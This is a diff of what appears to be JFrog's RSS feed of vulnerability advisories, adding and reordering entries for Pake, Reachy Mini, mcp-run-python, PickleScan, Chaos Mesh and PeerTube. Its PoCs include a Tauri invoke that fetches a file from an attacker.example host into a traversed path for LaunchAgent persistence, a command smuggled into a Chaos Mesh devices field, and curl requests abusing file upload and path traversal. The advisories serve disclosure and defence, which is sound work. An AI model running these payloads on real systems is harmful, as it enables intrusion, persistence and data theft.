@@ -4,11 +4,87 @@
         <title>JFrog Security Vulnerabilities</title>
         <link>https://research.jfrog.com/</link>
         <description>Latest vulnerability disclosures discovered by JFrog Security Research.</description>
-        <lastBuildDate>Tue, 01 Sep 2026 00:45:45 GMT</lastBuildDate>
+        <lastBuildDate>Tue, 01 Sep 2026 15:47:19 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Gridsome Feed Plugin</generator>
         <language>en</language>
         <atom:link href="https://research.jfrog.com/vulnerabilities/rss.xml" rel="self" type="application/rss+xml"/>
+        <item>
+            <title><![CDATA[Pake is vulnerable to Arbitrary File Write via Unsanitized download_file Filename]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/pake-is-vulnerable-to-arbitrary-file-write-via-unsanitized-download-file-filename-cve-2026-82635/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/pake-is-vulnerable-to-arbitrary-file-write-via-unsanitized-download-file-filename-cve-2026-82635/</guid>
+            <pubDate>Sun, 30 Aug 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2026-82635, HIGH, Pake is vulnerable to Arbitrary File Write via Unsanitized download_file Filename]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Pake is vulnerable to Arbitrary File Write via Unsanitized download_file Filename
+
+
+## Component
+
+Pake (tw93/Pake)
+
+## Affected versions
+
+< 3.13.1
+
+## Description
+
+Pake before 3.13.1 joins the JavaScript-supplied filename for the download_file Tauri command onto the user's Downloads directory with no sanitization. A filename containing path traversal sequences (for example ../Library/LaunchAgents/com.evil.plist) or an absolute path resolves outside ~/Downloads. The command then fetches attacker-controlled content from the supplied URL over Rust HTTP, not the browser, and writes it to that path.
+
+A script that can invoke the command can overwrite user-writable files and install persistence, such as a macOS LaunchAgent, a Linux autostart entry, or a Windows Startup-folder payload, leading to code execution in the user account. All desktop apps generated from an affected Pake tree expose the same command. Opening the wrapped app is the required user interaction; the default Pake IPC posture makes download_file reachable from the wrapped page.
+
+## PoC
+
+<br>
+
+**Step 1 - Serve a payload over HTTP**
+
+<br>
+
+Host a small file the Pake process will fetch, for example a proof marker or a LaunchAgent plist, on an attacker-controlled HTTP URL.
+
+<br>
+
+**Step 2 - Invoke download_file with a traversing filename**
+
+<br>
+
+From JavaScript in a Pake-generated app built from a tree before 3.13.1, call the unsanitized command:
+
+```javascript
+window.__TAURI__.core.invoke('download_file', {
+  params: {
+    url: 'http://attacker.example/pake_write_proof.sh',
+    filename: '../pake_write_proof.sh'
+  }
+})
+```
+
+<br>
+
+A second invoke with filename `../Library/LaunchAgents/com.pake.poc.plist` and a plist body that runs the first file demonstrates persistence.
+
+<br>
+
+**Step 3 - Confirm the write left Downloads**
+
+<br>
+
+Expected result: the fetched files appear under the user home directory (for example ~/pake_write_proof.sh and ~/Library/LaunchAgents/com.pake.poc.plist), not under ~/Downloads. Loading the LaunchAgent, or the next login, runs the fetched payload in the user session.
+
+## Vulnerability Mitigations
+
+Upgrade Pake to 3.13.1 or later and rebuild generated apps from that tree. The fix introduces sanitize_download_filename and uses only the final path segment before joining onto the Downloads directory, so ../ sequences and absolute paths cannot escape that directory (https://github.com/tw93/Pake/commit/a5463a84d6e36705ee0dd1886cf0e4b5a75b0ab4, first tagged in V3.13.1).
+
+## References
+https://www.cve.org/CVERecord?id=CVE-2026-82635
+https://github.com/tw93/Pake/commit/a5463a84d6e36705ee0dd1886cf0e4b5a75b0ab4
+https://github.com/tw93/Pake/releases/tag/V3.13.1
+https://github.com/tw93/Pake
+]]></content:encoded>
+        </item>
         <item>
             <title><![CDATA[The Reachy Mini Bluetooth command handler is vulnerable to Arbitrary Root Script Execution via Path Traversal]]></title>
             <link>https://research.jfrog.com/vulnerabilities/the-reachy-mini-bluetooth-command-handler-is-vulnerable-to-arbitrary-root-script-execution-via-path-traversal-cve-2026-62661/</link>
@@ -404,6 +480,82 @@ https://nvd.nist.gov/vuln/detail/CVE-2026-8461
 ]]></content:encoded>
         </item>
         <item>
+            <title><![CDATA[The Reachy Mini daemon is vulnerable to an Unrestricted File Upload in the Media Sounds Upload API]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/the-reachy-mini-daemon-is-vulnerable-to-an-unrestricted-file-upload-in-the-media-sounds-upload-api-cve-2026-55419/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/the-reachy-mini-daemon-is-vulnerable-to-an-unrestricted-file-upload-in-the-media-sounds-upload-api-cve-2026-55419/</guid>
+            <pubDate>Mon, 15 Jun 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2026-55419, MEDIUM, The Reachy Mini daemon is vulnerable to an Unrestricted File Upload in the Media Sounds Upload API]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+The Reachy Mini daemon is vulnerable to an Unrestricted File Upload in the Media Sounds Upload API
+
+
+## Component
+
+reachy-mini (reachy_mini daemon)
+
+## Affected versions
+
+< 1.8.2
+
+## Description
+
+The Reachy Mini daemon exposes POST /api/media/sounds/upload without authentication or file validation. An unauthenticated attacker can upload arbitrary files (not only sound files) into /tmp/reachy_mini_sounds/<original_filename> on the daemon host. The handler in src/daemon/app/routers/media.py (upload_sound) strips path traversal from the filename but does not enforce an extension allow-list, content checks, or size limits. The daemon binds 0.0.0.0 by default and uses permissive CORS (allow_origins=["*"]), so the endpoint is reachable on every network interface the daemon is connected to. This issue is the first step in a documented compromise chain that also includes Bluetooth authentication bypass and Bluetooth directory traversal.
+
+## PoC
+
+<br>
+
+**Step 1 - Start the daemon**
+
+<br>
+
+```
+.venv/bin/mjpython -m reachy_mini.daemon.app.main --sim --no-media
+```
+
+<br>
+
+**Step 2 - Confirm a normal wav upload works**
+
+<br>
+
+```
+curl -X POST http://<daemon_host>:<daemon_port>/api/media/sounds/upload \
+  -F "file=@/path/to/your/file.wav"
+```
+
+<br>
+
+**Step 3 - Upload an arbitrary shell script**
+
+<br>
+
+```
+curl -X POST http://<daemon_host>:<daemon_port>/api/media/sounds/upload \
+  -F "file=@/path/to/your/script.sh"
+```
+<br>
+
+**Step 4 - Verify the file was written**
+
+<br>
+
+The script is stored under /tmp/reachy_mini_sounds/ with no authentication challenge and no type rejection, confirming unrestricted upload.
+
+## Vulnerability Mitigations
+
+Upgrade to reachy-mini 1.8.2 or later. The fix allow-lists sound extensions, caps upload size, and validates content with GStreamer so only playable audio is accepted (https://github.com/pollen-robotics/reachy_mini/pull/1209). Until then, restrict network access to the daemon (firewall port 8000) and do not expose the media upload API on untrusted networks.
+
+## References
+https://github.com/pollen-robotics/reachy_mini/security/advisories/GHSA-m2pc-3q4q-w6jr
+https://github.com/pollen-robotics/reachy_mini/commit/984c7723b3ec5da63f4e0a2bcf9f120ceb563e04
+https://github.com/pollen-robotics/reachy_mini/releases/tag/v1.8.2
+https://nvd.nist.gov/vuln/detail/CVE-2026-55419
+]]></content:encoded>
+        </item>
+        <item>
             <title><![CDATA[The Reachy Mini Wireless image is vulnerable to a Local Privilege Escalation via an Unrestricted sudo systemctl Grant]]></title>
             <link>https://research.jfrog.com/vulnerabilities/the-reachy-mini-wireless-image-is-vulnerable-to-a-local-privilege-escalation-via-an-unrestricted-sudo-systemctl-grant-jfsa-2026-001667223/</link>
             <guid>https://research.jfrog.com/vulnerabilities/the-reachy-mini-wireless-image-is-vulnerable-to-a-local-privilege-escalation-via-an-unrestricted-sudo-systemctl-grant-jfsa-2026-001667223/</guid>
@@ -529,152 +681,6 @@ https://github.com/pollen-robotics/reachy-mini-os/security/advisories/GHSA-7rhg-
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[The Reachy Mini daemon is vulnerable to an Unrestricted File Upload in the Media Sounds Upload API]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/the-reachy-mini-daemon-is-vulnerable-to-an-unrestricted-file-upload-in-the-media-sounds-upload-api-cve-2026-55419/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/the-reachy-mini-daemon-is-vulnerable-to-an-unrestricted-file-upload-in-the-media-sounds-upload-api-cve-2026-55419/</guid>
-            <pubDate>Mon, 15 Jun 2026 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2026-55419, MEDIUM, The Reachy Mini daemon is vulnerable to an Unrestricted File Upload in the Media Sounds Upload API]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-The Reachy Mini daemon is vulnerable to an Unrestricted File Upload in the Media Sounds Upload API
-
-
-## Component
-
-reachy-mini (reachy_mini daemon)
-
-## Affected versions
-
-< 1.8.2
-
-## Description
-
-The Reachy Mini daemon exposes POST /api/media/sounds/upload without authentication or file validation. An unauthenticated attacker can upload arbitrary files (not only sound files) into /tmp/reachy_mini_sounds/<original_filename> on the daemon host. The handler in src/daemon/app/routers/media.py (upload_sound) strips path traversal from the filename but does not enforce an extension allow-list, content checks, or size limits. The daemon binds 0.0.0.0 by default and uses permissive CORS (allow_origins=["*"]), so the endpoint is reachable on every network interface the daemon is connected to. This issue is the first step in a documented compromise chain that also includes Bluetooth authentication bypass and Bluetooth directory traversal.
-
-## PoC
-
-<br>
-
-**Step 1 - Start the daemon**
-
-<br>
-
-```
-.venv/bin/mjpython -m reachy_mini.daemon.app.main --sim --no-media
-```
-
-<br>
-
-**Step 2 - Confirm a normal wav upload works**
-
-<br>
-
-```
-curl -X POST http://<daemon_host>:<daemon_port>/api/media/sounds/upload \
-  -F "file=@/path/to/your/file.wav"
-```
-
-<br>
-
-**Step 3 - Upload an arbitrary shell script**
-
-<br>
-
-```
-curl -X POST http://<daemon_host>:<daemon_port>/api/media/sounds/upload \
-  -F "file=@/path/to/your/script.sh"
-```
-<br>
-
-**Step 4 - Verify the file was written**
-
-<br>
-
-The script is stored under /tmp/reachy_mini_sounds/ with no authentication challenge and no type rejection, confirming unrestricted upload.
-
-## Vulnerability Mitigations
-
-Upgrade to reachy-mini 1.8.2 or later. The fix allow-lists sound extensions, caps upload size, and validates content with GStreamer so only playable audio is accepted (https://github.com/pollen-robotics/reachy_mini/pull/1209). Until then, restrict network access to the daemon (firewall port 8000) and do not expose the media upload API on untrusted networks.
-
-## References
-https://github.com/pollen-robotics/reachy_mini/security/advisories/GHSA-m2pc-3q4q-w6jr
-https://github.com/pollen-robotics/reachy_mini/commit/984c7723b3ec5da63f4e0a2bcf9f120ceb563e04
-https://github.com/pollen-robotics/reachy_mini/releases/tag/v1.8.2
-https://nvd.nist.gov/vuln/detail/CVE-2026-55419
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[mcp-run-python Deno SSRF]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/mcp-run-python-deno-ssrf-jfsa-2026-001653029/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/mcp-run-python-deno-ssrf-jfsa-2026-001653029/</guid>
-            <pubDate>Mon, 09 Feb 2026 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2026-25904, MEDIUM, Overly permissive Deno configuration in mcp-run-python leads to SSRF]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-Overly permissive Deno configuration in mcp-run-python leads to SSRF
-
-## Component
-
-mcp-run-python
-
-## Affected versions
-
-(,)
-
-## Description
-
-The Pydantic-AI MCP Run Python tool configures the Deno sandbox with an overly permissive configuration that allows the underlying Python code to access the localhost interface of the host to perform SSRF attacks. Note - the "mcp-run-python" project is archived and unlikely to receive a fix.
-
-## PoC
-
-1. Configure Claude-Desktop or any other MCP Client to use the Pydantic-AI MCP Run Python tool:
-
-   ```json
-   {
-   "mcpServers": {
-   "mcp-run-python":{
-           "command": "uvx",
-           "args": [
-           "mcp-run-python",
-           "stdio"
-           ]
-       }
-     }
-   }
-   ```
-
-2. Start a HTTP server listening to the localhost interface:
-
-   ```bash
-   python3 -m http.server -b 127.0.0.1 1234
-   ```
-
-3. Ask the MCP client to run this PoC code:
-
-   ```python
-   from pyodide.http import pyfetch
-   response = await pyfetch("http://localhost:1234")
-   data = await response.text()
-   print(data)
-   ```
-
-4. View that the localhost server got a request from the tool
-
-
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-## References
-
-
-
-]]></content:encoded>
-        </item>
-        <item>
             <title><![CDATA[mcp-run-python lack of isolation MCP takeover]]></title>
             <link>https://research.jfrog.com/vulnerabilities/mcp-run-python-lack-of-isolation-mcp-takeover-jfsa-2026-001653030/</link>
             <guid>https://research.jfrog.com/vulnerabilities/mcp-run-python-lack-of-isolation-mcp-takeover-jfsa-2026-001653030/</guid>
@@ -761,6 +767,76 @@ js.JSON.stringify = js_func
 9. The tool will seem stuck, Note the new notifications/tools/list\_changed notification from the server
 10. Click on `Clear` and then `List Tools`  
 11. Note that the tool name changed from `run_python_code` to `Hijacked Tool`
+
+
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this issue
+
+## References
+
+
+
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[mcp-run-python Deno SSRF]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/mcp-run-python-deno-ssrf-jfsa-2026-001653029/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/mcp-run-python-deno-ssrf-jfsa-2026-001653029/</guid>
+            <pubDate>Mon, 09 Feb 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2026-25904, MEDIUM, Overly permissive Deno configuration in mcp-run-python leads to SSRF]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Overly permissive Deno configuration in mcp-run-python leads to SSRF
+
+## Component
+
+mcp-run-python
+
+## Affected versions
+
+(,)
+
+## Description
+
+The Pydantic-AI MCP Run Python tool configures the Deno sandbox with an overly permissive configuration that allows the underlying Python code to access the localhost interface of the host to perform SSRF attacks. Note - the "mcp-run-python" project is archived and unlikely to receive a fix.
+
+## PoC
+
+1. Configure Claude-Desktop or any other MCP Client to use the Pydantic-AI MCP Run Python tool:
+
+   ```json
+   {
+   "mcpServers": {
+   "mcp-run-python":{
+           "command": "uvx",
+           "args": [
+           "mcp-run-python",
+           "stdio"
+           ]
+       }
+     }
+   }
+   ```
+
+2. Start a HTTP server listening to the localhost interface:
+
+   ```bash
+   python3 -m http.server -b 127.0.0.1 1234
+   ```
+
+3. Ask the MCP client to run this PoC code:
+
+   ```python
+   from pyodide.http import pyfetch
+   response = await pyfetch("http://localhost:1234")
+   data = await response.text()
+   print(data)
+   ```
+
+4. View that the localhost server got a request from the tool
 
 
 
@@ -1419,6 +1495,56 @@ No mitigations are supplied for this issue
 ]]></content:encoded>
         </item>
         <item>
+            <title><![CDATA[PickleScan Bypass via ZIP file bad CRC]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10156/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10156/</guid>
+            <pubDate>Sun, 21 Sep 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[A bad CRC in a ZIP archive causes PickleScan to fail, allowing malicious pickle files within the archive to evade detection.]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+An Improper Handling of Exceptional Conditions vulnerability in the ZIP archive scanning component of mmaitre314 picklescan allows a remote attacker to bypass security scans. This is achieved by crafting a ZIP archive containing a file with a bad Cyclic Redundancy Check (CRC), which causes the scanner to halt and fail to analyze the contents for malicious pickle files. When the file incorrectly considered safe is loaded, it can lead to the execution of malicious code.
+
+
+## Component
+
+[picklescan](https://pypi.org/project/picklescan/)
+
+## Affected versions
+
+( , 0.0.31)
+
+## Description
+
+The vulnerability stems from how PickleScan handles ZIP archives. It uses Python's standard `zipfile` module, which raises an exception when it encounters a file with a CRC mismatch. PickleScan does not handle this exception gracefully; it halts the scan instead of attempting to process other valid files within the archive. This behavior creates a security blind spot, as PyTorch may be configured to ignore CRC errors and load a model from the same corrupted archive, inadvertently executing a malicious pickle payload that PickleScan failed to detect.
+
+## PoC
+
+The following steps demonstrate the vulnerability using a public model with a known CRC error.
+
+```bash
+# 1. Download a Pytorch model known to have a bad CRC.
+wget https://huggingface.co/jinaai/jina-embeddings-v2-base-en/resolve/main/pytorch_model.bin?download=true -O pytorch_model.bin
+
+# 2. Attempt to scan the corrupted ZIP file with PickleScan.
+picklescan -p pytorch_model.bin
+
+# Observed Result: PickleScan returns an error about a bad ZIP file and does not scan any content within the archive.
+
+# Expected Result: PickleScan should warn about the CRC error but still attempt to scan accessible files within the archive for threats.
+```
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this issue
+
+## References
+
+[GHSA](https://github.com/advisories/GHSA-mjqp-26hc-grxg)
+[NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-10156)
+]]></content:encoded>
+        </item>
+        <item>
             <title><![CDATA[PickleScan Bypass via File Extension Mismatch]]></title>
             <link>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10155/</link>
             <guid>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10155/</guid>
@@ -1472,56 +1598,6 @@ No mitigations are supplied for this issue
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[PickleScan Bypass via ZIP file bad CRC]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10156/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10156/</guid>
-            <pubDate>Sun, 21 Sep 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[A bad CRC in a ZIP archive causes PickleScan to fail, allowing malicious pickle files within the archive to evade detection.]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-An Improper Handling of Exceptional Conditions vulnerability in the ZIP archive scanning component of mmaitre314 picklescan allows a remote attacker to bypass security scans. This is achieved by crafting a ZIP archive containing a file with a bad Cyclic Redundancy Check (CRC), which causes the scanner to halt and fail to analyze the contents for malicious pickle files. When the file incorrectly considered safe is loaded, it can lead to the execution of malicious code.
-
-
-## Component
-
-[picklescan](https://pypi.org/project/picklescan/)
-
-## Affected versions
-
-( , 0.0.31)
-
-## Description
-
-The vulnerability stems from how PickleScan handles ZIP archives. It uses Python's standard `zipfile` module, which raises an exception when it encounters a file with a CRC mismatch. PickleScan does not handle this exception gracefully; it halts the scan instead of attempting to process other valid files within the archive. This behavior creates a security blind spot, as PyTorch may be configured to ignore CRC errors and load a model from the same corrupted archive, inadvertently executing a malicious pickle payload that PickleScan failed to detect.
-
-## PoC
-
-The following steps demonstrate the vulnerability using a public model with a known CRC error.
-
-```bash
-# 1. Download a Pytorch model known to have a bad CRC.
-wget https://huggingface.co/jinaai/jina-embeddings-v2-base-en/resolve/main/pytorch_model.bin?download=true -O pytorch_model.bin
-
-# 2. Attempt to scan the corrupted ZIP file with PickleScan.
-picklescan -p pytorch_model.bin
-
-# Observed Result: PickleScan returns an error about a bad ZIP file and does not scan any content within the archive.
-
-# Expected Result: PickleScan should warn about the CRC error but still attempt to scan accessible files within the archive for threats.
-```
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-## References
-
-[GHSA](https://github.com/advisories/GHSA-mjqp-26hc-grxg)
-[NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-10156)
-]]></content:encoded>
-        </item>
-        <item>
             <title><![CDATA[PickleScan Unsafe Globals Check Bypass via Submodule Imports]]></title>
             <link>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10157/</link>
             <guid>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10157/</guid>
@@ -1567,6 +1643,61 @@ No mitigations are supplied for this issue
 
 [GHSA](https://github.com/advisories/GHSA-f7qq-56ww-84cr)
 [NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-10157)
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[Chaos Mesh cleanTcs command injection]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/chaos-mesh-command-injection-clean-tcs-jfsa-2025-001449534/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/chaos-mesh-command-injection-clean-tcs-jfsa-2025-001449534/</guid>
+            <pubDate>Mon, 15 Sep 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2025-59359, CRITICAL, OS command injection in Chaos Mesh via the cleanTcs mutation]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+OS command injection in Chaos Mesh via the cleanTcs mutation
+
+## Component
+
+github.com/chaos-mesh/chaos-mesh
+
+## Affected versions
+
+(,2.7.2]
+
+## Description
+
+The cleanTcs mutation in Chaos Controller Manager is vulnerable to OS command injection. In conjunction with CVE-2025-59358, this allows  unauthenticated in-cluster attackers to perform remote code execution across the cluster.
+
+## PoC
+
+```shell
+curl -X POST http://10.111.136.129:10082/query -H 'Content-Type: application/json' -d '{
+    "query": "mutation MutatePod($namespace: String! = \"default\", $podName: String!, $devices: [String!]!) { pod(ns: $namespace, name: $podName) { pod { name namespace } cleanTcs(devices: $devices) } }",
+    "variables": {
+      "namespace": "kube-system",
+      "podName": "coredns-5dd5756b68-779rm",
+      "devices": ["eth0 root; touch /tmp/foo; "]
+    }
+  }'
+
+```
+
+## Vulnerability Mitigations
+
+If upgrading Chaos-Mesh to the fixed version is not possible, re-deploy the Helm chart and disable the **chaosctl** tool and port:
+
+```shell
+helm install chaos-mesh chaos-mesh/chaos-mesh -n=chaos-mesh --version 2.7.x --set enableCtrlServer=false
+```
+
+
+
+## References
+
+[Fix PR](https://github.com/chaos-mesh/chaos-mesh/pull/4702)
+
+[JFrog Technical Blog](https://jfrog.com/blog/chaotic-deputy-critical-vulnerabilities-in-chaos-mesh-lead-to-kubernetes-cluster-takeover)
+
 ]]></content:encoded>
         </item>
         <item>
@@ -1658,61 +1789,6 @@ pid command } } }
 ```
 
 
-
-## Vulnerability Mitigations
-
-If upgrading Chaos-Mesh to the fixed version is not possible, re-deploy the Helm chart and disable the **chaosctl** tool and port:
-
-```shell
-helm install chaos-mesh chaos-mesh/chaos-mesh -n=chaos-mesh --version 2.7.x --set enableCtrlServer=false
-```
-
-
-
-## References
-
-[Fix PR](https://github.com/chaos-mesh/chaos-mesh/pull/4702)
-
-[JFrog Technical Blog](https://jfrog.com/blog/chaotic-deputy-critical-vulnerabilities-in-chaos-mesh-lead-to-kubernetes-cluster-takeover)
-
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[Chaos Mesh cleanTcs command injection]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/chaos-mesh-command-injection-clean-tcs-jfsa-2025-001449534/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/chaos-mesh-command-injection-clean-tcs-jfsa-2025-001449534/</guid>
-            <pubDate>Mon, 15 Sep 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2025-59359, CRITICAL, OS command injection in Chaos Mesh via the cleanTcs mutation]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-OS command injection in Chaos Mesh via the cleanTcs mutation
-
-## Component
-
-github.com/chaos-mesh/chaos-mesh
-
-## Affected versions
-
-(,2.7.2]
-
-## Description
-
-The cleanTcs mutation in Chaos Controller Manager is vulnerable to OS command injection. In conjunction with CVE-2025-59358, this allows  unauthenticated in-cluster attackers to perform remote code execution across the cluster.
-
-## PoC
-
-```shell
-curl -X POST http://10.111.136.129:10082/query -H 'Content-Type: application/json' -d '{
-    "query": "mutation MutatePod($namespace: String! = \"default\", $podName: String!, $devices: [String!]!) { pod(ns: $namespace, name: $podName) { pod { name namespace } cleanTcs(devices: $devices) } }",
-    "variables": {
-      "namespace": "kube-system",
-      "podName": "coredns-5dd5756b68-779rm",
-      "devices": ["eth0 root; touch /tmp/foo; "]
-    }
-  }'
-
-```
 
 ## Vulnerability Mitigations
 
@@ -2602,6 +2678,91 @@ No mitigations are supplied for this issue
 ]]></content:encoded>
         </item>
         <item>
+            <title><![CDATA[PeerTube Arbitrary Playlist Creation via REST API]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/peertube-arbitrary-playlist-creation-rest/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/peertube-arbitrary-playlist-creation-rest/</guid>
+            <pubDate>Mon, 14 Apr 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2025-32945 Medium severity. PeerTube Arbitrary Playlist Creation via REST API]]></description>
+            <content:encoded><![CDATA[## Summary
+This vulnerability allows an existing user to add playlists to a different user’s channel using the REST API.
+
+## Component
+
+[PeerTube](https://github.com/Chocobozzz/PeerTube)
+
+
+
+## Affected versions
+
+(, 7.1.0]
+
+
+
+## Description
+
+The server listens for POST requests to the **/api/v1/video-playlists** path. This path is used for adding a playlist to the PeerTube instance. The **createVideoPlaylist** function receives the request parameters and is in charge of creating the playlist. The following code sets all the parameters of the playlist:
+
+```js
+const videoPlaylist = new VideoPlaylistModel({
+    name: videoPlaylistInfo.displayName,
+    description: videoPlaylistInfo.description,
+    privacy: videoPlaylistInfo.privacy || VideoPlaylistPrivacy.PRIVATE,
+    ownerAccountId: user.Account.id
+}) as MVideoPlaylistFull
+
+videoPlaylist.url = getLocalVideoPlaylistActivityPubUrl(videoPlaylist) // We use the UUID, so set the URL after building the object
+
+if (videoPlaylistInfo.videoChannelId) {
+  const videoChannel = res.locals.videoChannel
+
+  videoPlaylist.videoChannelId = videoChannel.id
+  videoPlaylist.VideoChannel = videoChannel
+}
+
+```
+
+This code sets the owner of the new playlist to be the user who performed the request, and then sets the associated channel to the channel ID supplied by the request, without checking if it belongs to the user. This will allow any user to create a playlist in any existing channel on the server. The playlist will be owned by the attacking user, thus only the attacking user will be able to add and remove videos or change the properties of the playlist, while it will be listed in the web interface as belonging to a different user’s channel.
+
+
+
+## PoC
+
+This PoC assumes that there is a PeerTube instance on the machine listening on ports 3000 (client) and 9000 (server). We also assume that there are 2 existing users on the instance: the default root user and a low privileged user.
+
+
+
+1. First, using a browser, log in to the PeerTube instance with the low privileged user’s credentials, and use the inspection screen to copy the authorization token of the user.
+
+1. Browse to [**http://localhost:3000/api/v1/video-channels**](http://localhost:3000/api/v1/video-channels) and find a video-channel to attack. If there is none, add one to the root user using the web interface. The ID number of the channel will be needed for the next step.
+
+1. Run the following command (insert the user token and channel ID in the proper places):
+
+   ```
+   curl 'http://localhost:3000/api/v1/video-playlists' -H 'Authorization: Bearer user_token' -F "displayName=playlist" -F "videoChannelId=channel_id" -F "privacy=1"
+   ```
+
+   
+
+1. Browse to [**http://localhost:3000/api/v1/video-playlists**](http://localhost:3000/api/v1/video-playlists). The new playlist will be listed there with the attacking user listed as the owner and the attacked channel listed as the playlist’s channel.
+
+1. Using the web interface it will be possible to see the playlist listed in the attacked channel. The attacked user will not see it listed in the “My Library” page, nor will they be able to add or remove videos from it. The attacking user will see it listed under the “My Library” page, and will be able to add or remove videos to it.
+
+
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this issue
+
+
+
+## References
+
+[Fix release](https://github.com/Chocobozzz/PeerTube/releases/tag/v7.1.1)
+
+[PoC Materials](https://drive.google.com/file/d/1zmXFNutT4ACOJZGmxhU22nhu9Fbn4ui2/view?usp=drive_link)
+]]></content:encoded>
+        </item>
+        <item>
             <title><![CDATA[PeerTube ActivityPub Playlist Creation Blind SSRF and DoS]]></title>
             <link>https://research.jfrog.com/vulnerabilities/peertube-activitypub-playlist-creation-blind-ssrf-dos/</link>
             <guid>https://research.jfrog.com/vulnerabilities/peertube-activitypub-playlist-creation-blind-ssrf-dos/</guid>
@@ -2815,62 +2976,6 @@ No mitigations are supplied for this issue
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[PeerTube HLS Video Files Path Traversal]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/peertube-hls-path-traversal/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/peertube-hls-path-traversal/</guid>
-            <pubDate>Mon, 14 Apr 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2025-32943 Low severity. A Path Traversal allows any authenticated user to leak the contents of arbitrary .m3u8 files from the server]]></description>
-            <content:encoded><![CDATA[## Summary
-This vulnerability allows any authenticated user to leak the contents of arbitrary “.m3u8” files from the server.
-
-
-
-## Component
-
-[PeerTube](https://github.com/Chocobozzz/PeerTube)
-
-
-
-## Affected versions
-
-(, 7.1.0]
-
-
-
-## Description
-
-One of PeerTube’s API endpoints is `/static/streaming-playlists/hls/private/:videoUUID/:playlistName.m3u8`. This endpoint is used to fetch a `.m3u8` file of a private video. The code first checks that a valid video token was sent, and then sends the file contents. PeerTube does not sanitize the `playlistName` argument correctly. Instead of sanitizing the `playlistName` argument from `req.param`, [it tries to sanitize an optional playlistName argument from the query string](https://github.com/Chocobozzz/PeerTube/blob/f0f44e1704db1187ed267ced69cec414974275f5/server/core/middlewares/validators/static.ts#L74). An attacker can use the UUID of a public video, and insert `..%2f` in the `playlistName` field to traverse out of the video’s directory and into any other directory in the system and receive any `.m3u8` file. Reading a meaningful file might be difficult since there is a need to know the exact path of the specific `.m3u8` file wanted.
-
-## PoC
-
-This PoC assumes that there is a PeerTube instance on the machine listening on ports 3000 (client) and 9000 (server). Note that running this PoC will cause PeerTube’s server to shut down.
-
-1. First, using a browser, log in to the PeerTube instance with any user’s credentials.
-1. Upload a video to the server and make it private. Browse to the new uploaded video, and use the inspection screen to find and copy the video’s playlist UUID and .m3u8 filename. Save this information.
-1. Upload another video and make it public. Use the inspection screen to find and copy the video’s UUID.
-1. In a terminal, run the following commands (replace “public_uuid” with the UUID of the public video, “private_uuid” with the UUID of the private video, and “private_m3u8_file.m3u8” with the .m3u8 filename, all from step #1):
-
-```
-curl --path-as-is http://localhost:3000/static/streaming-playlists/hls/private/public_uuid/..%2fprivate_uuid%2fprivate_m3u8_file.m3u8 -H "x-peertube-video-password: 123"
-```
-The .m3u8 file will be returned.
-
-
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-
-
-## References
-
-[Fix release](https://github.com/Chocobozzz/PeerTube/releases/tag/v7.1.1)
-
